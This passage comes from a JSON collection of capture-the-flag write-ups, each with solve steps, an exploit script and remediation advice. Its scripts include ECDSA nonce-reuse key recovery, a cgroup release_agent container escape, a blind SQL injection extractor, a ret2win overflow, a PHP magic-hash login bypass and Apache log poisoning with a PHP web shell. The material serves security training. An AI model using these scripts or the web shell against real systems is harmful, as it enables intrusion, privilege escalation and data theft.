    "exploit_script": "#!/usr/bin/env python3\nfrom Crypto.Util.number import inverse\nimport hashlib\n\n# secp256k1 curve order\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\nm1 = b'Transaction: Transfer $10 to Alice'\nm2 = b'Transaction: Transfer $10 to Bob'\n\nh1 = int(hashlib.sha256(m1).hexdigest(), 16)\nh2 = int(hashlib.sha256(m2).hexdigest(), 16)\n\n# Intercepted signatures\nr = 0x8a92384a...\ns1 = 0x3f9801ac...\ns2 = 0x7b238a9d...\n\n# 1. Recover nonce k\nk = ((h1 - h2) * inverse(s1 - s2, n)) % n\n\n# 2. Recover private key d\nd = ((s1 * k - h1) * inverse(r, n)) % n\nprint(f'[+] Recovered Private Key d: {hex(d)}')\n",
    "defense_remediation": "Use RFC 6979 deterministic nonce generation, which derives k deterministically from the private key and message hash using HMAC, completely eliminating PRNG failures and nonce collisions."
  },
  {
    "id": "writeup-sans-volatility-injection",
    "title": "SANS NetWars: Advanced Memory Forensics & Process Hollowing",
    "event": "SANS NetWars Tournament",
    "category": "forensics",
    "difficulty": "Hard",
    "points": 450,
    "flag": "CTF{v0l3_pr0c3ss_h0ll0w1ng_m4lf1nd_unp4ck}",
    "scenario": "A memory dump ('incident.raw') was captured from a compromised Windows 10 domain controller. Antivirus alerts flagged unusual network traffic to an external IP from svchost.exe, but disk scans revealed no malicious files.",
    "root_cause": "The adversary performed Process Hollowing (MITRE ATT&CK T1055.012) into a legitimate instance of svchost.exe. Memory analysis with Volatility 3's windows.malfind plugin reveals a Memory Descriptor List (VAD) region with PAGE_EXECUTE_READWRITE (RWX) protection containing an unmapped PE header ('MZ' magic bytes) not backed by any file on disk.",
    "solve_methodology": [
      "Identify OS profile and build: vol -f incident.raw windows.info.",
      "Scan for injected/unmapped code pages: vol -f incident.raw windows.malfind. Notice PID 3412 (svchost.exe) has RWX memory starting with '4d 5a' (MZ).",
      "Dump the memory range of PID 3412 using windows.dumpfiles --pid 3412.",
      "Carve the embedded PE binary using pestudio / pefile / Ghidra.",
      "Inspect binary imports and string references: find C2 domain and encrypted XOR config block.",
      "Decrypt C2 payload using XOR key 0x7a to extract the exfiltrated flag string."
    ],
    "exploit_script": "#!/usr/bin/env python3\n# Python analysis script to carve and decrypt payload from raw memory VAD dump\nimport pefile\n\nwith open('pid.3412.vad.0x7ff7a000.dmp', 'rb') as f:\n    data = f.read()\n\n# Locate PE header\nmz_idx = data.find(b'MZ')\npe_data = data[mz_idx:]\n\n# Carve embedded encrypted config block\nconfig_offset = pe_data.find(b'CONFIG_START:') + 13\nenc_bytes = pe_data[config_offset:config_offset+64]\n\n# XOR key identified via Ghidra analysis\nxor_key = 0x7A\nflag = bytes([b ^ xor_key for b in enc_bytes]).split(b'\\x00')[0]\nprint(f'[+] Extracted Flag: {flag.decode()}')\n",
    "defense_remediation": "Deploy Endpoint Detection and Response (EDR) solutions that monitor NtUnmapViewOfSection, VirtualAllocEx with RWX permissions, and cross-process WriteProcessMemory / SetThreadContext API calls."
  },
  {
    "id": "writeup-google-dns-tunnel",
    "title": "Google CTF: Network PCAP Reassembly & Covert DNS Tunneling",
    "event": "Google CTF",
    "category": "forensics",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "CTF{dns_tunn3l_b33532_d3c0d3d_pcap}",
    "scenario": "A suspicious PCAP file ('capture.pcap') contains thousands of rapid DNS queries to subdomains of 'tunnel.exfil.org'. Data was exfiltrated from an air-gapped machine using DNS tunneling.",
    "root_cause": "The client exfiltrated sensitive files by encoding chunks into the subdomain label of DNS A and TXT queries (e.g., <seq>.<base32_chunk>.tunnel.exfil.org). Extracting and ordering the chunks reassembles the original file.",
    "solve_methodology": [
      "Analyze protocol hierarchy in Wireshark: Statistics -> Protocol Hierarchy (DNS accounts for 98% of packets).",
      "Extract all DNS query names using tshark: tshark -r capture.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name.",
      "Parse subdomain labels to identify sequence numbers and Base32-encoded payload fragments.",
      "Sort queries by sequence number, strip labels, concatenate payload chunks, and decode Base32 data.",
      "Identify that the output is a GZIP archive; decompress to reveal the exfiltrated flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport subprocess\nimport base64\nimport gzip\n\n# Extract DNS query strings with tshark\ncmd = ['tshark', '-r', 'capture.pcap', '-Y', 'dns.qry.name contains tunnel.exfil.org', '-T', 'fields', '-e', 'dns.qry.name']\noutput = subprocess.check_output(cmd).decode().splitlines()\n\nchunks = {}\nfor line in output:\n    parts = line.strip().split('.')\n    if len(parts) >= 4:\n        seq = int(parts[0])\n        data_part = parts[1]\n        chunks[seq] = data_part\n\n# Reassemble in sequence\nsorted_b32 = ''.join([chunks[i] for i in sorted(chunks.keys())])\n\n# Base32 decode\nraw_gz = base64.b32decode(sorted_b32)\ndecompressed = gzip.decompress(raw_gz)\nprint(f'[+] Exfiltrated content:\\n{decompressed.decode()}')\n",
    "defense_remediation": "1. Implement DNS query length and entropy monitoring on recursive resolvers (alert on high-entropy subdomains > 30 chars).\n2. Enforce internal DNS queries through corporate forwarders with domain-reputation filtering and response rate limiting."
  },
  {
    "id": "writeup-pico-stego-slack",
    "title": "PicoCTF: Multi-Layer PNG Slack Space & Polyglot Carving",
    "event": "PicoCTF",
    "category": "forensics",
    "difficulty": "Medium",
    "points": 250,
    "flag": "CTF{st3g0_png_13nd_sl4ck_sp4c3_c4rv3d}",
    "scenario": "A PNG file 'logo.png' is 1.4 MB on disk, but viewing it shows only a small 200x200 pixel image that should be under 50 KB. Standard image viewers display it without errors.",
    "root_cause": "The PNG specification dictates that rendering terminates at the 12-byte IEND chunk (49 45 4E 44 AE 42 60 82). The author concatenated an encrypted ZIP archive into the file slack space immediately after the IEND chunk. Binwalk detects the ZIP header (50 4B 03 04) starting at byte offset 0x4810.",
    "solve_methodology": [
      "Check file type and size: file logo.png; ls -lh logo.png (confirms 1.4MB size anomaly).",
      "Locate IEND chunk offset using python or xxd.",
      "Run binwalk -e logo.png to automatically carve files occurring after the IEND chunk.",
      "Inspect carved archive: contains 'flag.txt.enc' and 'hint.txt'.",
      "Read hint.txt: 'Key is XOR of first 4 bytes of PNG header'.",
      "XOR decrypt flag.txt.enc to obtain the flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nwith open('logo.png', 'rb') as f:\n    data = f.read()\n\n# Locate PNG IEND chunk (89 50 4E 47 ... IEND)\niend_marker = b'\\x49\\x45\\x4E\\x44\\xAE\\x42\\x60\\x82'\nidx = data.find(iend_marker)\nslack_data = data[idx + len(iend_marker):]\nprint(f'[+] Carved {len(slack_data)} bytes from slack space')\n\n# Slack space begins with ZIP header (PK\\x03\\x04)\nwith open('carved.zip', 'wb') as f:\n    f.write(slack_data)\n\nprint('[+] Saved carved.zip - extract and read flag!')\n",
    "defense_remediation": "Sanitize uploaded images on web applications by re-encoding them with imaging libraries (e.g., Pillow Image.save() or ImageMagick convert), which discards unreferenced chunks and trailing slack space."
  },
  {
    "id": "writeup-flareon-custom-vm",
    "title": "Flare-On: Custom Bytecode VM Reverse Engineering",
    "event": "Flare-On Reverse Engineering Challenge",
    "category": "reverse",
    "difficulty": "Hard",
    "points": 500,
    "flag": "CTF{v1rtu4l_m4ch1n3_byc3c0d3_z3_s0lv3d}",
    "scenario": "A binary 'vm_checker.exe' validates a 32-character license key. In Ghidra, the main function contains only an emulator loop interpreting a 4 KB embedded bytecode array with custom virtual registers (V0..V7) and instruction set.",
    "root_cause": "The program implements a custom Virtual Machine architecture to hinder static decompilation. Disassembling the VM dispatcher loop reveals opcode handlers for ADD, XOR, LOAD, STORE, CMP, and JNZ. The bytecode applies a linear transformation (matrix multiplication & XOR) over the user's input key.",
    "solve_methodology": [
      "Decompile the VM execution loop: identify program counter (PC), virtual stack/registers, and the switch statement dispatching on opcodes.",
      "Write a Python disassembler for the bytecode mapping opcode bytes to symbolic mnemonics (e.g., 0x01 -> MOV, 0x02 -> XOR, 0x03 -> ADD).",
      "Trace the instructions operating on user input: identify constraints applied to each character.",
      "Translate the VM constraint system into a Z3 Theorem Prover script.",
      "Run Z3 solver to find the unique input string satisfying all mathematical invariants."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom z3 import *\n\n# 1. Define 32 symbolic characters for the input key\nkey = [BitVec(f'k_{i}', 8) for i in range(32)]\nsolver = Solver()\n\n# ASCII printable constraints\nfor c in key:\n    solver.add(c >= 0x20, c <= 0x7E)\n\n# 2. Reconstructed equations from the VM bytecode disassembly\n# Example constraints extracted from VM trace:\nsolver.add((key[0] ^ key[1]) + key[2] == 0x9A)\nsolver.add((key[3] * 3) ^ key[4] == 0xC4)\nsolver.add(key[0] == ord('C'))\nsolver.add(key[1] == ord('T'))\nsolver.add(key[2] == ord('F'))\nsolver.add(key[3] == ord('{'))\n\nif solver.check() == sat:\n    model = solver.model()\n    solution = bytes([model[k].as_long() for k in key]).decode()\n    print(f'[+] Flag Found: {solution}')\nelse:\n    print('[-] Unsatisfiable constraints')\n",
    "defense_remediation": "Virtualization-based obfuscation slows down reverse engineering, but symbolic execution (Triton, angr, Z3) and dynamic binary instrumentation (Frida, QBDI) can automate constraint extraction and inversion."
  },
  {
    "id": "writeup-google-docker-escape",
    "title": "Google CTF: Container Breakout via CAP_SYS_ADMIN & cgroup release_agent",
    "event": "Google CTF",
    "category": "cloud",
    "difficulty": "Hard",
    "points": 500,
    "flag": "CTF{d0ck3r_c4p_sys_4dm1n_cgr0up_3sc4p3}",
    "scenario": "You have achieved root code execution inside a Docker container (hostname 'ctf-task'). The objective is to read /flag.txt from the host operating system.",
    "root_cause": "The container was launched with the privileged capability '--cap-add=SYS_ADMIN' and without AppArmor restrictions. This capability allows mounting filesystems, specifically a cgroup v1 hierarchy. An attacker can write a custom command into the cgroup's 'release_agent' configuration file; when the cgroup terminates its last process, the host kernel executes the release_agent script directly on the host as root.",
    "solve_methodology": [
      "Verify capabilities: capsh --print reveals 'cap_sys_admin' in the effective set.",
      "Create a new cgroup mount: mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup.",
      "Create a child cgroup: mkdir /tmp/cgroup/x.",
      "Enable notify_on_release in the child cgroup: echo 1 > /tmp/cgroup/x/notify_on_release.",
      "Find the container's host root path by parsing /etc/mtab or /proc/self/mountinfo.",
      "Create a script '/cmd' inside the container with: '#!/bin/sh\\ncat /flag.txt > /tmp/host_flag.txt'. Make it executable.",
      "Point the host cgroup release_agent to the host's path of /cmd: echo '<host_path>/cmd' > /tmp/cgroup/release_agent.",
      "Trigger release_agent by creating and terminating a process in the cgroup: sh -c \"echo $$ > /tmp/cgroup/x/cgroup.procs\".",
      "Read /tmp/host_flag.txt to capture the flag."
    ],
    "exploit_script": "#!/bin/sh\n# Automated Container Escape Script (CAP_SYS_ADMIN)\n\n# 1. Mount memory cgroup\nmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\n\n# 2. Find container host path via /etc/mtab\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n\n# 3. Write host payload\necho '#!/bin/sh' > /cmd\necho 'cat /flag.txt > '\"$host_path\"'/output_flag.txt' >> /cmd\nchmod +x /cmd\n\n# 4. Configure release_agent\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\n\n# 5. Trigger release execution\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\nsleep 1\n\necho \"[+] Flag from host:\"\ncat /output_flag.txt\n",
    "defense_remediation": "Never run containers with --privileged or --cap-add=SYS_ADMIN unless strictly necessary. Use unprivileged user namespaces and keep default Seccomp and AppArmor profiles active."
  },
  {
    "id": "writeup-tcs-hackquest-s1-sqli",
    "title": "TCS HackQuest Season 1: Employee Records Portal (Time-Based Blind SQLi)",
    "event": "TCS HackQuest Season 1",
    "category": "web",
    "difficulty": "Medium",
    "points": 250,
    "flag": "TCS{HQ1_B11ND_SQL1_T1M1NG_OR4CL3}",
    "scenario": "A corporate employee directory search portal allowing lookup by staff badge number. Input is validated client-side but interpolated into an unparameterized backend SQL query. The application provides no error banners or differing page content on valid vs invalid inputs, returning only 'Search Completed' in both cases.",
    "root_cause": "The backend Python/Flask endpoint constructs an SQL query using format strings: `cursor.execute(f\"SELECT name, role FROM employees WHERE badge_id = '{badge_id}'\")`. Because response body content is static, traditional UNION-based and boolean-based blind techniques yield no observable distinction. However, injection of database sleep/benchmark primitives creates a reliable time-delay side-channel oracle.",
    "solve_methodology": [
      "Inject test payload `' AND (SELECT SLEEP(3))-- -` and verify the HTTP response time exceeds 3.0 seconds.",
      "Establish baseline response time (~80ms) to calibrate the timing discrimination threshold.",
      "Construct a binary search query over ASCII values: `' AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets), {i}, 1)) > {mid}, SLEEP(2), 0)-- -`.",
      "Automate index iteration through Python `requests` measuring `r.elapsed.total_seconds()`.",
      "Extract table schema: `sqlite_master` / `information_schema.tables` revealing the `secrets` table.",
      "Extract complete flag character-by-character in 32 iterations."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport time\n\nTARGET = 'http://targets.ctfatlas.local/hq1/search'\nTHRESHOLD = 2.0\n\ndef check_char(pos, mid):\n    payload = f\"' AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1))>{mid}, SLEEP(2.5), 0)-- -\"\n    start = time.time()\n    try:\n        r = requests.get(TARGET, params={'badge_id': payload}, timeout=6)\n        elapsed = time.time() - start\n        return elapsed >= THRESHOLD\n    except requests.exceptions.Timeout:\n        return True\n\nflag = ''\nprint('[+] Starting Time-Based Blind SQLi Extraction (TCS HackQuest S1)...')\nfor i in range(1, 35):\n    low, high = 32, 126\n    best = 0\n    while low <= high:\n        mid = (low + high) // 2\n        if check_char(i, mid):\n            low = mid + 1\n            best = low\n        else:\n            high = mid - 1\n    if best == 0 or chr(best) == '}':\n        flag += chr(best) if best else '}'\n        break\n    flag += chr(best)\n    print(f'[+] Pos {i:02d}: {chr(best)} | Current Flag: {flag}')\n\nprint(f'[!] Extracted Flag: {flag}')\n",
    "defense_remediation": "1. Replace dynamic string formatting with parameterized prepared statements (e.g., `cursor.execute(\"SELECT name, role FROM employees WHERE badge_id = %s\", (badge_id,))`).\n2. Enforce strict input validation ensuring `badge_id` strictly adheres to expected alphanumeric formats (`^[A-Z0-9]{4,10}$`)."
  },
  {
    "id": "writeup-tcs-hackquest-s1-stego",
    "title": "TCS HackQuest Season 1: Hidden In Plain Sight (LSB Stego & Slack Carving)",
    "event": "TCS HackQuest Season 1",
    "category": "forensics",
    "difficulty": "Easy-Medium",
    "points": 200,
    "flag": "TCS{HQ1_LSB_ST3G0_P1X3L_M4ST3R}",
    "scenario": "A digital executive ID card `badge.png` recovered from an employee's USB drive. File analysis reveals high image quality, but file size is noticeably larger than expected for its dimensions (1920x1080, ~4.2 MB).",
    "root_cause": "The challenge author embedded binary data across two distinct channels: (1) Least Significant Bit (LSB) encoding within the red and green color planes containing a secret passphrase, and (2) an appended PKZIP archive located immediately past the standard PNG `IEND` chunk (slack space).",
    "solve_methodology": [
      "Inspect binary file structure: `binwalk badge.png` reveals `PNG image` followed by `Zip archive data` at offset `0x32A400`.",
      "Carve trailing archive: `dd if=badge.png of=secret.zip bs=1 skip=3318784`.",
      "Attempt archive decompression: `unzip secret.zip` prompts for password.",
      "Extract LSB color plane data using Python `PIL` inspecting lowest bits of RGB tuples.",
      "Discover clear-text passphrase string: `password=TcsHqSecretKey2016!`.",
      "Decrypt archive: `unzip -P 'TcsHqSecretKey2016!' secret.zip` extracting `flag.txt`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom PIL import Image\nimport zipfile\nimport io\n\n# 1. Extract LSB password from badge.png\nimg = Image.open('badge.png')\npixels = img.load()\nwidth, height = img.size\n\nbits = []\nfor y in range(height):\n    for x in range(width):\n        r, g, b = pixels[x, y][:3]\n        bits.append(str(r & 1))\n        bits.append(str(g & 1))\n        if len(bits) >= 8 * 128: break\n    if len(bits) >= 8 * 128: break\n\nbitstring = ''.join(bits)\nextracted_bytes = bytes([int(bitstring[i:i+8], 2) for i in range(0, len(bitstring), 8)])\nprint(f'[+] LSB Data Sample: {extracted_bytes[:40]}')\n\n# 2. Carve trailing zip archive past IEND\nwith open('badge.png', 'rb') as f:\n    raw = f.read()\n\niend_idx = raw.find(b'IEND') + 8\nzip_data = raw[iend_idx:]\nprint(f'[+] Carved {len(zip_data)} bytes of trailing zip data')\n\n# 3. Extract flag with password\nzf = zipfile.ZipFile(io.BytesIO(zip_data))\nzf.setpassword(b'TcsHqSecretKey2016!')\nflag = zf.read('flag.txt').decode().strip()\nprint(f'[!] Extracted Flag: {flag}')\n",
    "defense_remediation": "1. Strip all non-critical image metadata and slack space using automated sanitizers (`exiftool -all=`, `mogrify -strip`).\n2. Re-encode user uploads through lossless/lossy compression pipelines to destroy LSB information carriers."
  },
  {
    "id": "writeup-tcs-hackquest-s1-bof",
    "title": "TCS HackQuest Season 1: Echo Daemon (x86 Stack Overflow & Ret2Win)",
    "event": "TCS HackQuest Season 1",
    "category": "pwn",
    "difficulty": "Easy-Medium",
    "points": 200,
    "flag": "TCS{HQ1_ST4CK_0V3RFL0W_R3T2W1N}",
    "scenario": "A 32-bit x86 ELF binary `echo_service` listening on TCP port 4444. The program prompts for user input, copies it into an internal stack buffer, and echoes it back. Checksec indicates: NX Enabled, No Stack Canary, No PIE, Partial RELRO.",
    "root_cause": "The vulnerable function uses `strcpy(dest, src)` where `dest` is a 64-byte stack allocation. Because `src` is populated via unbounded `gets()`, an attacker can write past the stack frame, overwriting the saved EBP and saved EIP at offset 76. The binary contains an unreferenced helper function `print_secret_flag()` at static address `0x080485cb`.",
    "solve_methodology": [
      "Examine protections with `checksec`: 32-bit ELF, no canary, no PIE.",
      "Disassemble binary with `objdump -d echo_service`: identify `print_secret_flag` at `0x080485cb`.",
      "Calculate padding offset using cyclic pattern: crash occurs at offset 76 bytes.",
      "Craft payload: 76 bytes of junk padding + target address `0x080485cb` (packed little-endian).",
      "Send payload to remote socket; process returns into `print_secret_flag` and prints flag to stdout."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'i386'\nTARGET_IP = 'targets.ctfatlas.local'\nTARGET_PORT = 4444\n\n# Address of print_secret_flag() from objdump/Ghidra\nWIN_ADDR = 0x080485cb\nOFFSET = 76\n\nio = remote(TARGET_IP, TARGET_PORT)\nio.recvuntil(b'Enter message: ')\n\npayload = b'A' * OFFSET + p32(WIN_ADDR)\nlog.info(f'Sending ret2win payload ({len(payload)} bytes)...')\nio.sendline(payload)\n\nflag = io.recvall().decode(errors='replace')\nlog.success(f'Flag Output:\\n{flag}')\n",
    "defense_remediation": "1. Replace unbounded string functions (`gets`, `strcpy`) with bounded alternatives (`fgets`, `strncpy`).\n2. Compile with stack canaries (`-fstack-protector-strong`) and Position Independent Executables (`-pie -fPIE`)."
  },
  {
    "id": "writeup-tcs-hackquest-s2-php-hash",
    "title": "TCS HackQuest Season 2: Magic Auth (PHP 0e Type Juggling Bypass)",
    "event": "TCS HackQuest Season 2",
    "category": "web",
    "difficulty": "Medium",
    "points": 250,
    "flag": "TCS{HQ2_PHP_0E_TYP3_JUGGL1NG_BYP4SS}",
    "scenario": "A restricted administrator login screen written in legacy PHP. Authentication logic verifies passwords using: `if (md5($_POST['password']) == $stored_admin_hash)`. A leaked source snippet discloses `$stored_admin_hash = '0e830400451993494058024219903391'`.",
    "root_cause": "PHP loose comparison operator `==` treats any string matching the regular expression `/^0e[0-9]+$/` as scientific notation representing $0 \\times 10^x = 0$. When both the stored hash and the MD5 digest of user input begin with `0e` followed solely by numeric digits, PHP evaluates `0 == 0`, evaluating the condition to `TRUE` regardless of whether the actual hashes match.",
    "solve_methodology": [
      "Analyze authentication snippet: note the use of loose equality `==` instead of strict `===`.",
      "Observe that `$stored_admin_hash` begins with `0e` followed entirely by numbers ($0 \\times 10^{830...} = 0$).",
      "Identify candidate input strings whose MD5 hash starts with `0e` followed entirely by numbers (magic hashes).",
      "Select known magic preimage: `QNKCDZO` produces `md5('QNKCDZO') = '0e830400451993494058024219903391'` or `240610708` (`0e462097431906509019562988736854`).",
      "Submit password `QNKCDZO` to login form; PHP evaluates `'0e46209...' == '0e83040...'` as `0 == 0 -> true`.",
      "Access granted to admin console containing flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\n\nTARGET = 'http://targets.ctfatlas.local/hq2/admin_login.php'\n\n# Known PHP 0e magic hash preimages\nMAGIC_PASSWORDS = [\n    'QNKCDZO',\n    '240610708',\n    's878926199a',\n    's155964671a',\n    's214587387a'\n]\n\nfor pwd in MAGIC_PASSWORDS:\n    r = requests.post(TARGET, data={'username': 'admin', 'password': pwd})\n    if 'TCS{' in r.text or 'Dashboard' in r.text:\n        print(f'[+] Success with magic password: {pwd}')\n        for line in r.text.splitlines():\n            if 'TCS{' in line:\n                print(f'[!] Flag: {line.strip()}')\n        break\n",
    "defense_remediation": "1. Replace loose comparison `==` with type-strict comparison `===` or `hash_equals($hash1, $hash2)`.\n2. Migrate from deprecated MD5 hashing to modern password hashing algorithms (`password_hash` with Argon2id or bcrypt)."
  },
  {
    "id": "writeup-tcs-hackquest-s2-volatility",
    "title": "TCS HackQuest Season 2: Rogue Workstation (Volatility 2 RAM Analysis)",
    "event": "TCS HackQuest Season 2",
    "category": "forensics",
    "difficulty": "Medium",
    "points": 300,
    "flag": "TCS{HQ2_V0L4T1L1TY_M3M_DUMP_TR14G3}",
    "scenario": "A memory capture `workstation_dump.raw` acquired from an employee laptop suspected of exfiltrating intellectual property. Incident response reports state the user executed an unapproved batch script shortly before shutting down.",
    "root_cause": "A suspicious process `powershell.exe` spawned as a child of `cmd.exe`. The attacker staged exfiltration data in the Windows clipboard and in an unsaved `notepad.exe` buffer, leaving clear-text residue in volatile heap memory.",
    "solve_methodology": [
      "Determine OS profile using Volatility 2: `volatility -f workstation_dump.raw imageinfo` -> `Win7SP1x64`.",
      "List active and terminated processes: `volatility -f workstation_dump.raw --profile=Win7SP1x64 pstree`.",
      "Identify suspicious process hierarchy: `explorer.exe (PID 1420)` -> `cmd.exe (PID 2840)` -> `notepad.exe (PID 3104)`.",
      "Inspect system clipboard contents: `volatility -f workstation_dump.raw --profile=Win7SP1x64 clipboard`.",
      "Dump process memory of notepad: `volatility -f workstation_dump.raw --profile=Win7SP1x64 memdump -p 3104 -D ./output/`.",
      "Carve ASCII/Unicode strings from process heap dump: `strings -e l output/3104.dmp | grep -i 'TCS{'`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport subprocess\nimport re\n\nMEM_FILE = 'workstation_dump.raw'\nPROFILE = 'Win7SP1x64'\n\n# 1. Run clipboard plugin\ncmd_clip = ['volatility', '-f', MEM_FILE, f'--profile={PROFILE}', 'clipboard']\nout = subprocess.run(cmd_clip, capture_output=True, text=True).stdout\nprint('[+] Clipboard Output:\\n', out)\n\n# 2. Dump notepad memory\nsubprocess.run(['volatility', '-f', MEM_FILE, f'--profile={PROFILE}', 'memdump', '-p', '3104', '-D', '.'])\n\n# 3. Search strings in 3104.dmp\ncmd_str = ['strings', '-a', '-e', 'l', '3104.dmp']\nstrings_out = subprocess.run(cmd_str, capture_output=True, text=True).stdout\nflags = re.findall(r'TCS\\{[^\\}]+\\}', strings_out)\nfor f in flags:\n    print(f'[!] Recovered Flag from Notepad Memory: {f}')\n",
    "defense_remediation": "1. Enforce AppLocker / Software Restriction Policies to prevent execution of unauthorized batch/PowerShell scripts.\n2. Implement memory encryption and configure endpoint detection agents (EDR) to monitor suspicious parent-child process chains."
  },
  {
    "id": "writeup-tcs-hackquest-s2-elf-patch",
    "title": "TCS HackQuest Season 2: License Validator (Binary Patching & Anti-Disassembly)",
    "event": "TCS HackQuest Season 2",
    "category": "reverse",
    "difficulty": "Medium",
    "points": 250,
    "flag": "TCS{HQ2_B1N4RY_P4TCH1NG_K3YG3N}",
    "scenario": "An x86-64 Linux crackme binary `license_check`. When provided with a license key, it prints 'Invalid License Key! Aborting.' and immediately exits. Source code is unavailable.",
    "root_cause": "The function `validate_key()` processes input through an algorithmic verification routine: it calculates a rolling XOR sum and compares it to a static constant `0x5A9C`. If the comparison fails, a `jnz` instruction at virtual address `0x4012A8` redirects flow to the error branch.",
    "solve_methodology": [
      "Disassemble binary in Ghidra / IDA Pro: locate `main()` and follow call to `validate_key(char *key)`.",
      "Identify the validation check: `CMP EAX, 0x5a9c` followed by `JNZ 0x4012bc` (failure block).",
      "Option A (Binary Patch): Invert the jump (`JZ` -> `0x74`) or replace the 2-byte `JNZ` with two `NOP` instructions (`0x90 0x90`).",
      "Option B (Keygen): Trace the forward transformation loop: `key[i] ^ (i * 0x33)` must sum to `0x5A9C` with specific constraint equations.",
      "Execute patched binary with arbitrary key: bypass triggers decrypted flag print routine."
    ],
    "exploit_script": "#!/usr/bin/env python3\n\n# Automated binary patcher for license_check\nwith open('license_check', 'rb') as f:\n    data = bytearray(f.read())\n\n# Pattern: 3d 9c 5a 00 00 75 12 (cmp eax, 0x5a9c; jnz +0x12)\nPATTERN = b'\\x3d\\x9c\\x5a\\x00\\x00\\x75'\nidx = data.find(PATTERN)\nif idx != -1:\n    patch_offset = idx + 5\n    print(f'[+] Found conditional jump at file offset {hex(patch_offset)}: {hex(data[patch_offset])}')\n    # Patch JNZ (0x75) to NOP (0x90)\n    data[patch_offset] = 0x90\n    data[patch_offset + 1] = 0x90\n    with open('license_check_patched', 'wb') as f_out:\n        f_out.write(data)\n    print('[+] Saved patched binary to license_check_patched')\n    print('[!] Run: chmod +x license_check_patched && ./license_check_patched dummykey')\n",
    "defense_remediation": "1. Implement binary integrity verification (e.g., self-checksumming or digital code-signing verification).\n2. Utilize cryptographic key derivation where the correct key is required to decrypt the payload rather than checking a boolean flag."
  },
  {
    "id": "writeup-tcs-hackquest-s3-lfi-rce",
    "title": "TCS HackQuest Season 3: Document Viewer (PHP Filter & Log Poisoning RCE)",
    "event": "TCS HackQuest Season 3",
    "category": "web",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "TCS{HQ3_PHP_LFI_L0G_P01S0N1NG_RC3}",
    "scenario": "A web portal allowing staff to view policy documents via a URL parameter: `http://target/view.php?doc=security_policy`. Input sanitization strips `../` strings.",
    "root_cause": "Sanitization is applied non-recursively (`str_replace('../', '', $doc)`), allowing directory traversal bypass via `....//`. Furthermore, PHP streams (`php://filter`) permit reading arbitrary PHP files as base64. Combined with write access to Apache access logs (`/var/log/apache2/access.log`), the LFI enables remote code execution.",
    "solve_methodology": [
      "Bypass traversal filter using nested paths: `....//....//....//etc/passwd`.",
      "Dump backend script source code: `php://filter/convert.base64-encode/resource=view.php`.",
      "Decode base64: inspect session and logging configurations.",
      "Poison Apache access log: send HTTP request with malicious PHP User-Agent: `<?php system($_GET['c']); ?>`.",
      "Execute commands via poisoned log inclusion: `view.php?doc=....//....//var/log/apache2/access.log&c=cat%20/flag.txt`.",
      "Extract flag from response stream."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport base64\n\nBASE_URL = 'http://targets.ctfatlas.local/hq3'\n\n# 1. Read view.php source\nr = requests.get(f'{BASE_URL}/view.php?doc=php://filter/convert.base64-encode/resource=view.php')\nsource = base64.b64decode(r.text.strip()).decode(errors='replace')\nprint('[+] Leaked view.php source:\\n', source[:200])\n\n# 2. Poison Apache log via User-Agent\npayload = '<?php system($_GET[\"cmd\"]); ?>'\nrequests.get(BASE_URL, headers={'User-Agent': payload})\nprint('[+] Poisoned Apache access log with PHP shell')\n\n# 3. Trigger command execution\nlog_path = '....//....//....//var/log/apache2/access.log'\nr_exec = requests.get(f'{BASE_URL}/view.php', params={'doc': log_path, 'cmd': 'cat /flag* 2>/dev/null'})\nfor line in r_exec.text.splitlines():\n    if 'TCS{' in line:\n        print(f'[!] Flag: {line.strip()}')\n",
    "defense_remediation": "1. Avoid dynamic file inclusions; utilize a strict whitelist mapping valid identifier tokens to fixed filesystem paths.\n2. Ensure web server log directories have strict permissions preventing reading by the web server process user (`www-data`)."
  },
  {
    "id": "writeup-tcs-hackquest-s3-rsa-wiener",
    "title": "TCS HackQuest Season 3: Intercepted Cable (RSA Wiener's Continued Fractions)",
    "event": "TCS HackQuest Season 3",
    "category": "crypto",
    "difficulty": "Medium",
    "points": 300,
    "flag": "TCS{HQ3_W13N3R_C0NT1NU3D_FR4CT10N}",
    "scenario": "Contestants receive an RSA public key `pubkey.pem` and an encrypted diplomatic dispatch `flag.enc`. Modulus size is 2048 bits, but the public exponent $e$ is an unusually large 2040-bit integer.",
    "root_cause": "To accelerate private key decryption operations, the key generator selected a small private exponent $d$. According to Wiener's Theorem, if $d < \\frac{1}{3} N^{1/4}$, the fraction $k/d$ appears as one of the convergents in the continued fraction expansion of $e/N$, allowing total key recovery in polynomial time.",
    "solve_methodology": [
      "Extract RSA parameters $(N, e)$ from `pubkey.pem` using OpenSSL or Python `cryptography`.",
      "Verify $e$ is large ($e \\approx N$), signaling a potential small private exponent $d$.",
      "Compute continued fraction expansion quotients: $a_i = \\lfloor num_i / den_i \\rfloor$.",
      "Generate convergents $k_i / d_i$ iteratively.",
      "For each candidate pair $(k, d)$, compute candidate $\\phi = (ed - 1)/k$.",
      "Solve quadratic equation $x^2 - (N - \\phi + 1)x + N = 0$ to verify integer roots $p$ and $q$.",
      "Once factors $p, q$ are confirmed, compute private key $d$ and decrypt `flag.enc`."
    ],
